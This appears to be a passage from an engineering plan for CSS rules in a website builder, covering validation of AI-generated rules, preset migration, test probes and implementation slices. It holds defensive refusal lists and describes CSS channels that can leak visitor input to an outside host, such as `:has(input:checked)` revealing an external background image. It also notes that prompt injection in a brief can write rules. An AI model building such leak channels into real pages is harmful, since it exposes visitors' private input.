top of its sheet. Motion in the panel follows the design skills' rules.

## AI output

The validator gains `props.rules`, through the same parser, with each rule's body through the existing
`style()` and `url()` checks. Everything parseable is accepted, but for what reads a visitor (below), and the
prompt teaches little, following the split the goal `fleet-ai-allowlists` introduces.

- `schemaDocs` teaches Hover, Pressed and Focused on links and buttons, `::before` and `::after` for
  decoration, `:nth-child` for rhythm, and `prefers-color-scheme` when asked. Nothing else.
- `MAX_GENERATED_RULES` of 24 per generation, as appear effects are capped: "hover on everything" is a
  known tell. `effects.hover` remains not generated.
- Motion rules hold for generated output only: `infinite` is refused, and an `animation` is wrapped in
  `@media (prefers-reduced-motion: no-preference)`. Authored and imported rules are left as they are,
  because fidelity is the point of an import.

Rules from the generator need the canvas, or nobody can see what it made, so this slice follows slice 6.

Decided while building slice 9, say so if you disagree:

- **A generated rule is never kept in part.** A declaration the validator refuses, in any breakpoint of a map,
  drops the whole rule, as the parser does. Only a repair keeps it: a kebab-case key, a font outside the
  library, a z-index clamped, an unknown breakpoint key, a missing id.
- **The motion rules also bind Normal and the review,** because a stored `@keyframes` can be played from
  `props.style`, where no gate can hold it. So `infinite` is refused on the animation properties in both, a
  stored name (`u-`) outside a rule is refused, and `validateReviewOps` refuses both for the same reason. A
  count above 10, a `!`, and any function but a timing function in `animation`, `animationName` or
  `animationIterationCount`, count as `infinite`, because each can hide it. The value is read as tokens with
  its strings blanked first, because CSS needs no separator after a string or a `)`. Other Normal `animation`
  values stay. This binds generated output only: nothing in the panel or the parser checks motion, so no
  authored path shares it.
- **The gate takes the animation and its start values.** A rule that also holds a colour splits in two, and
  both count towards the cap, so a visitor who asked for reduced motion keeps the rest of the state. What a
  keyframes of the generation moves goes behind the gate with it, and so does anything that hides a node
  (`opacity:0`, `visibility:hidden`, `display:none`, a zero scale, a full clip), from the same rule, another
  rule with the same parts, and the Normal and plain `&` rules of every node the animation can land on,
  children under `& > p` included. From Normal it moves to a gated rule on the node that held it, so a visitor
  with no preference sees what was written. A colour stays in Normal, because it hides nothing. Which child a
  selector lands on is read wider than a browser would, because a child shown early costs less than one
  never shown. Otherwise a reveal never shows for the visitor who asked for less motion.
- **Bounded is not short.** A generated animation can still run ten times for a million seconds, thirty can
  fit one value, and a `transition` under `@starting-style` is an entrance no gate covers. Each ends, and only
  the animations sit behind the gate.
- **A generated rule cannot read a visitor, on a list of allowed pseudo-classes:** the pointer states, the
  structural ones, `:is`, `:not`, `:where` and `:has`. So `:checked`, `:valid`, `:placeholder-shown`, `:target`,
  `:visited` and any new state are refused to the generator. Those rows lose their AI cell, on purpose, as
  `ai-rule-refused`, and stay open to a person. This is why the AI column ends below this slice's ceiling.
- **A generated rule cannot look past its node** (`looksBeyondNode` in `surfaces.ts`): no combinator inside
  `:is`, `:where` or `:not`, no sibling step at the start of any `:has()` entry, at any depth, and no `@scope`
  with a prelude. The one outward form kept is exactly `:is(.dark *)`.
- **A generation with a rule keeps no address on another host,** in Normal or an `img`, but the stock library,
  site paths and what the selected component already loads: its `style` values and the `src` of an `img`, never
  its text, which reaches the model too. `&:hover` and a media condition remain, and a
  rule can switch on what Normal holds, so without this a generation can still report a visitor. The address
  goes rather than the rule. What stays open: a rule added beside an address the page already holds can
  still switch it on, and only an enforced Content Security Policy closes that (open question 1), which now
  matters more, because a prompt injection in a brief can write the rule.
- **A generated selector holds at most 8 parts and `maxStyleValueChars` in total,** and a generation spends at
  most 32 KiB of the page's 256 KiB rule budget, in sheet bytes, counting one block per part and per
  breakpoint. Past a page cap the sheet drops a rule and all later ones, so this is what keeps a generation
  from taking an owner's rules. **Where that stops:** the validator sees one generation, not the page. Seven
  full generations earlier in the page than an owner's rule leave it in place, and the eighth, or fewer on a
  page that already spends the budget, can remove it. The sheet reports the drop in its log and nothing refuses
  it. A page-wide check would have to run where the whole page is known, at apply, which this slice does not do.
- **Keyframes and `@position-try` go through every style check,** because a keyframe could otherwise animate a
  z-index past the banner. Descriptors are no CSS properties, so only their values are checked.
- **The single-value tells apply to rules,** because the tells screen reads `props.style` only.
- **A review tree shows a rule's maps with breakpoint ids, and a selection sent back with them loses those
  values with a warning,** as a `props.style` map does in a selection today. The review never edits a rule.

## React import and export

Step 7 builds this; the contract says what it targets, and `parseCssText` is the single entry.

- **Import** compiles Tailwind to real CSS, as the plan says, and hands the CSS to `parseCssText`. Tailwind
  is mobile first and our cascade is desktop first, so `md:p-4` maps to a breakpoint map only when its
  width is exactly a page breakpoint. Otherwise it stays literal as
  `at: ['@media (min-width: 640px)']`, which is exact, and the canvas evaluates it per frame. `hover:`
  arrives as the same selector and gate as the Hover state, so it reads as Hover in the panel.
- `group-hover:` and `dark:` land as `&:is(.group:hover *)` and `&:is(.dark *)`.
- Global names are given the `u-` prefix at import, where every reference is in view.
- **What the parser refuses is reported line by line,** never dropped, per the plan's rule that a
  half-understood component must fail loudly. That includes `@layer` wrappers and external addresses.
- **Export:** `rules` is a named prop in the normalised round-trip form, like bindings. Real React output
  emits one CSS block with a scoped class, from the same `buildResponsiveCss`.

## Migration of the presets

Saved pages and published rows hold `props.effects`, and nothing about them is rewritten. Pages render per
request from the stored snapshot, so anything slice 5 changes reaches every live site at deploy, without a
republish. That is why a preset must not behave like an authored rule.

**Hover.** `effects.hover` stays stored forever, as the name of a preset. `hoverPresetRules(kind)` in
`effects.ts` returns the rule text with the same numbers. A node gets a shared class, `fc_fx-lift`,
`fc_fx-dim` or `fc_fx-underline`, in place of `data-fx-h`. Each kind used on the page is emitted once, in
place 3 of the sheet, through the same emitter. `applyEffects` only leaves a mark on the node, and
`applyResponsiveStyles` issues the class: that step removes every stored `fc_` name, and it is the one that
calls the emitter. A mark set after hydration is one no stored page can spell, where an exception for
`fc_fx-` would have had to tell a stored name from an issued one, a `className` map included.

| Kind | Rules on the shared class, same specificity and order as today |
|---|---|
| dim | `.fc_fx-dim:hover{opacity:0.8}` under the pointer gate; `.fc_fx-dim{transition:...}` under the pointer and reduced-motion gates |
| lift | `.fc_fx-lift:hover{translate:0 -2px}` and its transition, under both gates |
| underline | `.fc_fx-underline:hover{text-decoration-line:underline;text-underline-offset:0.2em}` under the pointer gate |

Normal does not move, so a preset node keeps its inline style, its own `transition`, its own `translate`
and any value the sheet would refuse. **There is no visible change at deploy,** including the cases where
inline beats the preset today: `dim` over an inline `opacity` still does nothing until someone authors a
Hover. The size is also right: one shared block rather than about 362 bytes per node. A person's own
Hover rule is (0,3,0), so it wins over the preset's (0,2,0), and the two need no detach step. Adding that
rule is what moves the node's Normal, under decision 5. Place 3 does change one tie, on no saved page: a
rule with the bare selector `&` is (0,2,0) and now comes after the preset, so it wins under the pointer.

This depends on the media wrappers, which is why it comes after slice 3. The published page moves first;
once the preview takes the same path in slice 6, `EFFECTS_BASE_CSS`, `FX_ATTR.hover` and the `data-fx-h`
attribute are removed. The panel, `compactEffects` and the yjs shape keep working on the stored field
throughout.

**Precondition of slice 5.** A read-only count over saved snapshots: how many preset nodes hold a value
the sheet refuses. Slice 5 itself cannot lose these, but it sizes what the first authored rule on such a
node will do, and no such value exists in `src`, so the risk is only visible in stored data. Workers do
not touch production, so the operator runs it and writes the number in the slice's pull request. Run on
2026-11-02: 221 stored nodes across the 7 saved production pages, 0 with `effects`, 0 with a hover preset.

**Appear and scroll stay.** Keyframes could hold a reveal, but what triggers it is
`IntersectionObserver` in `runtime.ts`, plus a promise that nothing is hidden without JavaScript, and a
stagger across children. Parallax is scroll-linked and has no rule form that is safe across browsers.
They keep `props.effects`, `startStateCss` and `--fx-*`, unchanged. They are the kind of thing step 6
(the behaviour model) may subsume, not this step. They coexist with rules: `--fx-*` values reach an
element the same way from a class as inline, the start state is gated by `data-fx-in`, and parallax's
inline `translate` beats an authored one, as lift already avoids in the panel.

## Score changes

These belong to the slices, and they make the probes stricter or more correct. None removes a test.

- **`encodings.ts` is rewritten to the real format,** as its header anticipates. `ruleNode` writes
  `props.rules`, and the AI probe reads rules back rather than `style` keys. Both `matrix.published` and
  `matrix.canvas` import it, so slice 1 changes both.
- **`samples.json`** gets `&` forms, and at-rules get real bodies with a marker. `color` is not a valid
  descriptor in `@font-face` or a `@keyframes` selector, so the current probe could never pass honestly
  against a validator.
- **`stylesheetHasRule`** checks each part for the selector list row, and the rule class for the nesting
  row, where `&` itself is resolved rather than emitted.
- **A probe bug, closed in slice 1.** `probeWidthMediaFeature` expects `@media (max-width:767.98px)` for a
  Tablet value. A Tablet override's query sits below Desktop's min width, so the sheet says
  `1279.98px`: the header of `responsiveCss.ts` and `maxWidthBelow` agree, and the row's cell
  (`pass media-queries pass pass pass`) has been a false failure since the first score. The regular
  expression takes the width from `maxWidthBelow(BREAKPOINTS[0].minWidth)`.
- **`matrix.canvas.score.tsx`** renders `CanvasRuleStyles` next to `ComponentRenderer`, because that is
  what the canvas mounts. Pointer rows and environment media rows are probed with `previewRule` set,
  against a table of expected rewrites written in the test, not imported from the code under test.
- **`matrix.panel.jsdom.score.tsx`** hard-codes every selector row as a failure. It drives the switch and
  types each row's sample into the custom field, and a row counts when the rule is in the node.
- **Credit is labelled.** A panel cell closed by the raw text field carries the note `raw field`, an AI cell
  accepted but not taught carries `accepted, not taught`, and `report.ts` counts both apart. Otherwise
  Panel's 11.3 percent would read as controls that do not exist.
- **`corpus/fixtures.ts`:** trees gain the rules their originals have. Its header's "a tree never carries
  a state's value" was right while the format had no place for one, and it is reworded.
- **One canvas parity check** in slice 6, because nothing in the corpus reads the canvas, so a passing
  corpus says nothing about the surfaces agreeing: `hover-focus` rendered on the mounted canvas with each
  state previewed, compared with the published page's computed styles in that state.

## Slices

Each is one file-scoped pull request, green alone, raising `baseline.json` with
`pnpm score:primitives --update-baseline` where a number rises. Row counts are cells gained; a pull request
states the real figure. The fleet plan estimated six slices here; the canvas, the presets and the round
trip were not in it.

Two dependencies are goals outside this plan, both real files in `~/software-dev/orchestrator/goals/fleet/`
and neither merged yet at this writing: `fleet-general-editor` and `fleet-ai-allowlists`.

The selector rows closed in slice 2, by their `latest.json` ids (`css-selector:<id>`):

| Family | Rows | Ids |
|---|---|---|
| Basics | 11 | `Type selectors`, `Class selectors`, `ID selectors`, `Universal selectors`, `Attribute selectors`, `Nesting selector`, `Selector list`, `Next-sibling combinator`, `Subsequent-sibling combinator`, `Child combinator`, `Descendant combinator` |
| Pointer | 5 | `:hover`, `:active`, `:focus`, `:focus-visible`, `:focus-within` |
| Location | 5 | `:any-link`, `:link`, `:visited`, `:target`, `:target-current` |
| Form | 17 | `:autofill`, `:checked`, `:default`, `:disabled`, `:enabled`, `:in-range`, `:indeterminate`, `:invalid`, `:optional`, `:out-of-range`, `:placeholder-shown`, `:read-only`, `:read-write`, `:required`, `:user-invalid`, `:user-valid`, `:valid` |
| Structure | 11 | `:empty`, `:first-child`, `:first-of-type`, `:last-child`, `:last-of-type`, `:nth-child()`, `:nth-last-child()`, `:nth-last-of-type()`, `:nth-of-type()`, `:only-child`, `:only-of-type` |
| Logic | 7 | `:defined`, `:dir()`, `:has()`, `:is()`, `:lang()`, `:not()`, `:where()` |
| Media and display | 16 | `:buffering`, `:current`, `:fullscreen`, `:future`, `:modal`, `:muted`, `:open`, `:past`, `:paused`, `:picture-in-picture`, `:playing`, `:popover-open`, `:seeking`, `:stalled`, `:volume-locked`, `:xr-overlay` |
| Pseudo-elements | 22 | `::after`, `::backdrop`, `::before`, `::checkmark`, `::cue`, `::cue()`, `::details-content`, `::file-selector-button`, `::first-letter`, `::first-line`, `::grammar-error`, `::highlight()`, `::marker`, `::part()`, `::picker-icon`, `::picker()`, `::placeholder`, `::scroll-marker`, `::scroll-marker-group`, `::selection`, `::spelling-error`, `::target-text` |

That is 94 rows. With `:scope` in slice 3, the 12 exclusions and the 11 that stay failing: all 118.

| # | Slice | Files | Tag | Depends on | Closes |
|---|---|---|---|---|---|
| 1 | `rules-format` | `src/lib/rules/rules.ts` and tests, `src/lib/rules/states.ts`, `ComponentModel.ts`, `renderComponentNode.tsx`, `test/score/lib/encodings.ts`, `lib/types.ts`, `samples.json`, `exclusions.json`, `matrix.published.score.ts`, `matrix.canvas.score.tsx`, `matrix.browser.score.ts` | `renderer` | none | Renderer cell of `css-media-feature:width` (+1). The 12 exclusions, gap `page-level-css`. Parser unit tests over every sample and every refusal in this document, the address check and each spelling of the `value` refusal included |
| 2 | `rules-selectors` | `responsiveCss.ts`, `applyResponsiveStyles.ts`, `fonts/registry.ts`, `corpus/fixtures.ts` | | 1 | Format and renderer for the 94 rows above. Rule class, stay-inline fallback, string escapes, caps. Fixtures `hover-focus`, `pseudo-elements`, `shadcn-button`. A test that a refused value on a node with a rule is still on the page |
| 3 | `rules-conditions` | `src/lib/rules/rules.ts`, `responsiveCss.ts`, `corpus/fixtures.ts` | | 2 | Format and renderer for `css-at-rule:@media`, `@supports`, `@container`, `@scope`, `@starting-style`, the 33 media features other than `width`, and `:scope` (39 rows). Fixtures `container-query`, `print-styles` |
| 4 | `rules-definitions` | `src/lib/rules/rules.ts`, `responsiveCss.ts`, `applyResponsiveStyles.ts`, `corpus/fixtures.ts`, `samples.json` | | 2 | Format and renderer for `@keyframes`, `@font-face`, `@font-feature-values`, `@font-palette-values`, `@counter-style`, `@property`, `@position-try` (7 rows). Per-at-rule identity, Regular and Bold both kept. Fixture `keyframes` |
| 5 | `rules-hover-presets` | `effects.ts`, `applyEffects.ts`, `responsiveCss.ts`, `renderPublishedPage.tsx`, `publishedEffects.test.tsx` | | 3; **precondition:** the operator's read-only count | No row, on purpose: a preset never counts. The preview keeps its old path until slice 6. Proof: published HTML identical apart from the attribute becoming a class and the hover text moving; in Chromium, computed styles for each kind unchanged on hover, on a touch profile and under reduced motion; a sentinel node with an SVG `data:` background, its own `transition` and a stored `translate` shows all three as before |
| 6 | `rules-canvas` | `src/lib/rules/surfaces.ts`, `surfaceSheet.ts`, `CanvasRuleStyles.tsx`, `ResponsivePageRenderer.tsx`, `PreviewFrame.tsx`, `HeadlessComponentRenderer.tsx`, `effects.ts`, `EffectsStyles.tsx`, `EditorUIStore.ts`, `src/lib/effects/__tests__/effects.test.ts`, `src/lib/renderer/__tests__/headlessEffects.test.tsx`, `matrix.canvas.score.tsx` | | 3, 4, 5 | Canvas for all 140 rows. Browser proof on the mounted editor: no reaction to the pointer, previewed Hover in two frames, previewed Pressed showing Hover's values, an inline-styled node beaten by its rule, a rule that cannot make a node unselectable, a locked node selectable or text uneditable, a `forwards` reveal at rest including `::before` and floating elements. The canvas parity check |
| 7 | `rules-state-switch` | `StateSwitch.tsx`, `useStyleTarget.ts`, the six style sections, `breakpointSource.ts`, `HudSurface.tsx`, `RightSidebar.tsx`, `matrix.panel.jsdom.score.tsx` | | 6, `fleet-general-editor` | Panel for `:hover`, `:active`, `:focus-visible` (3 rows). All four stateful paths in tests, and a browser proof of Hover at Tablet from the panel to a published page |
| 8 | `rules-custom` | `parseCssText` in `rules.ts`, a custom rule field and list, `matrix.panel.jsdom.score.tsx`, `report.ts` | | 7 | Panel for the other 137 rows, labelled `raw field` |
| 9 | `rules-ai` | `validate.ts`, `ai/review/ops.ts`, `promptSections`, goldens, `report.ts` | | 3, 4, 6, `fleet-ai-allowlists` | AI for all 140 rows, labelled `accepted, not taught` where the prompt does not teach them |
| 10 | `rules-round-trip` | `test/score/roundtrip/jsx.ts`, `roundtrip.score.ts` | | 4 | New round-trip cases for rules: a state with a breakpoint map, a definition, a refused rule. Tailwind import stays with step 7 |

Only slice 1 touches one of the two renderer files (`renderComponentNode.tsx`,
`createComponentElement.tsx`), because the emission lives in `responsiveCss.ts` and
`applyResponsiveStyles.ts`. Slices 2 to 5 share `responsiveCss.ts`, so the operator runs them in order.

**What the slices add up to,** as ceilings, out of 1,832 rows after the 12 exclusions:

| Column | Today | After | Percent | What is left |
|---|---|---|---|---|
| Format | 1,578 | 1,718 | 93.8 | The 100 event handler rows (step 6), the 14 `page-level-css` rows |
| Published page | 1,537 | 1,678 | 91.6 | Those, the interaction patterns, blocked embeds, element attributes |
| Canvas | 1,524 | 1,664 | 90.8 | Those, plus the mounted editor's own differences |
| Panel | 67 | 207 | 11.3 | Mostly the general editor, a separate slice. 137 of these 140 are the raw field |
| AI | 273 | 413 | 22.5 | Mostly the allowlists, a separate slice |
| Corpus | 3 of 13 | 9 of 13 | | Expected, not proven: the score says these six are blocked by this gap alone. `radix-accordion` also needs behaviour |

The published column gains 141: the 140 rows plus the `width` probe.

**A matrix pass here proves less than it reads.** A selector row says the rule reached the sheet and an
engine parsed it, not that any real page needs it. The corpus is the test that counts.

## What this does not cover

- **Page-level rules:** `@layer` ordering, `@page`, `@view-transition` and selectors on `body`. Gap 5 of
  the primitives plan, where the remaining red rows close. `:root` closed first, see decision 13.
- **Component states and page state.** Layers 2 and 3. They should reuse `SelectorRule`.
- **A keyframes timeline editor,** and proper controls for container queries. Text works; good controls
  are a product question once this format exists.
- **A value holding `<` outside a string,** such as `attr()` with a type, still works inline only.
- **A CSS escape in a value.** A backslash stays refused, so in a rule `content: "\201C"` must be typed as
  the literal character. In Normal it now stays inline instead of being lost.
- **Bindings in rules.** A `{{row.colour}}` can be Normal, never Hover. A row's dynamic hover colour would
  go through a custom property set in Normal.
- **`url()` in Normal,** which stays as open as it is today, and is the residual route above.

## Decided here, say so if you disagree

The fleet plan gives contracts to a fresh review agent before fan-out, and the review of 2026-11-02 has
happened. These do not wait for Marlin.

1. `props.rules` beside `style`, rather than nested in it.
2. Selectors must start with `&`. This does not rule out ancestor conditions: `&:is(.dark *)` passes and
   works, which is what imports need.
3. The `u-` prefix instead of rewriting names per node.
4. 12 rows excluded with reasons, 14 left as honest failures under `page-level-css`.
5. The canvas does not react to the real pointer or the editor's environment, unlike a browser and like
   Framer's canvas.
6. Focused means `:focus-visible`, not `:focus`.
7. `effects.hover` stays stored, on a shared class, and a preset never moves Normal. So `dim` over an
   inline `opacity` stays broken until someone authors a Hover, which is today's behaviour.
8. Attribute selectors on `value` with an operator are refused, as the protection for typed text.
9. External addresses are refused inside rules and definitions, without limiting `:is()` and `:has()`.
10. `@layer` is refused as a wrapper.
11. Generated rules are capped at 24, while everything parseable is accepted but what reads a visitor.
12. A range comparison's `<` is rewritten by the parser rather than refused, so `<` still never reaches the
    sheet.
13. The document gets one rule shape, added 2026-11-02 for BusBasis: a stored rule with the exact selector
    `:root`, in `props.rules` of the page root and nowhere else, so it travels, snapshots and undoes like any
    rule and the panel can list it later. It is not the `&` boundary loosened, because `:root *` and any other
    selector stay refused, it holds no `when`, only `@media` and `@supports` wrap it, and only `ROOT_PROPERTIES`
    and custom properties may be set: `display`, `visibility`, `pointerEvents` and the like would reach the
    consent banner, which is not part of the tree. A definition root is refused, because a component does not
    own the document. On the canvas and the preview, which share a document with the editor, it never reaches
    `:root`: custom properties and inherited text land on the page root of each copy, under that node's own
    values, and scrolling shows nothing. A `rem` there still reads the editor's document.
    Changed by the review of #261: `--fc-` custom properties are refused, because the sticky bar's height
    positions the consent banner. What the list opens by inheritance is pinned on the banner's root, and a test
    walks the list. On a real page `body` sets its own colours and font, so a rule setting `color`,
    `backgroundColor` or `fontFamily` adds a constant `body` declaration under the same conditions. The emitter
    checks the keys again, and `:root` typed in the panel is the real rule on the page root and a reason
    anywhere else. The recheck added: the banner's look fails closed, so a pair it cannot read goes neutral and
    a font from outside the registry goes neutral, and the sticky bar is capped and the lift clamped to 30vh.
    Still apart: Tailwind tokens such as `--background` recolour `body` on the published page,
    and the editor frames do not read them.

## Review findings not adopted

Everything in F1 to F14 is applied except the following, each checked rather than waved away.

1. **F3 step 3, "remove decision 8" (the `value` refusal). Kept.** The step rests on "once there is no
   channel it protects nothing", and a channel remains. In Chromium on 2026-11-02, with no address in any
   rule, a hidden element with a Normal `background-image` to an external host sent no request on load and
   one when a rule's `:has(input:checked)` set `display:block`. So the refusal still protects typed text,
   the most sensitive input. The false comfort the review warned about is answered by stating the limit,
   and every spelling it listed is covered by reading the attribute's name instead of matching text.
2. **F3's framing that closing the functions closes the sink. Adopted as a fix, not as a claim.** The
   refusals are in, and this plan calls the result closed inside rules, with the route above as residual.
3. **F12 "a row counts if any tested engine parses it", in the harness. Adapted.** The seven WebKit-only
   rows count, confirmed for `:buffering` in the same run. They are a written list rather than a second
   browser in the score, because that would add a download and a browser run to continuous integration
   for seven rows, against the five-minute rule. The probe fails if Chromium starts to parse one. Also
   checked: `col || td` fails in WebKit too, which the review left open, so the row is excluded.
4. **F10 "`fleet-general-editor` and `fleet-ai-allowlists` are not ids anywhere on `main`". True, and they
   are real.** Both are goal files in `~/software-dev/orchestrator/goals/fleet/`, where the operator
   dispatches from. They are kept and named as such.
5. **F13 "`[class^="fc-"]` passes".** Refused now, but only as far as text can go, and marked as stability
   rather than safety, since `[class*="c-a1"]` cannot be enumerated and only narrows the match.
6. **F12's 1,724 for Format. Superseded.** It predates F4 and the cut below. The figure here is 1,718.

Taken from the review's optional items: the F12 "possible cut" of `@page`, `@view-transition`, `:first`,
`:left` and `:right`, because keeping `:root` red for owning the document while storing `@page` on a node
would be the inconsistency it describes. F9 is applied more widely than proposed: all non-width media
features are previewable, not only `prefers-*`, `print` and `hover`, since none of them describes the frame.
The F8 neutraliser keeps one accepted edge, stated at the canvas.

## Open questions

1. **For Marlin: a Content Security Policy on published pages,** limiting `img-src` and `font-src` to the
   site, the storage host and `data:`. It is the only complete fix for the residual route above, and it
   would also close the existing plain `url()` in `props.style`, the same visitor-address exposure this
   plan treats as a problem for fonts, and the timing switch that definitions add, which reports how long a
   visitor stayed and which nothing else closes. Published pages have a report-only policy today, which
   stops nothing. It would break any site that hot-links images from another host, so
   it is a product and legal trade-off. The review recommends it, with a report-only period first. The
   editor host would need its own decision. **Nothing in this plan depends on the answer.**

   **Report-only exists; enforcing it is Marlin's call.** Published pages carry
   `Content-Security-Policy-Report-Only` (`src/lib/site/cspReportOnly.ts`, sent from the middleware,
   never on the editor host or its previews) over `img-src`, `font-src` and `media-src`, allowing the
   site, `images.unsplash.com`, `data:` and `blob:`. It blocks nothing, and it does not close the
   residual route: it only measures what enforcing would block. Browsers post to `/api/csp-report`,
   which keeps a count per site, directive and blocked host and nothing about the visitor. `pnpm
   csp:report` prints the counts (`deploy/README.md`). Enforcing is the same header without
   `-Report-Only`, and it would have to be true that:

   - the counts have run long enough over real traffic that the hosts left in them are known, each
     either added to the policy or accepted as breaking for the site that uses it;
   - every site owner hot-linking from another host is told first and has a way to bring those files
     onto the site. Until uploads reach pages there is no such way, so storage must exist and its host
     be named in the policy (question 2 is the same host);
   - the editor warns when a page uses an address the policy would block, so a new one does not break
     silently after publishing;
   - violations stay measured after enforcing, and the legal view (a third-party image before consent)
     and the product view (some sites lose images) have been weighed by Marlin;
   - it is understood what this does not cover: `<a ping>` is a `connect-src` request, and `connect-src`
     is not measured, so neither the counts nor an enforced policy of these directives would show or
     stop it. Reports can also be forged, so a count is a lead to check, never proof of a host.
2. **`@font-face` from an uploaded font.** `src` takes site paths today, and an uploaded file would live
   on the storage host. Allowing it needs that host named, which is a decision for whichever slice adds
   font upload. Not needed by any slice here.
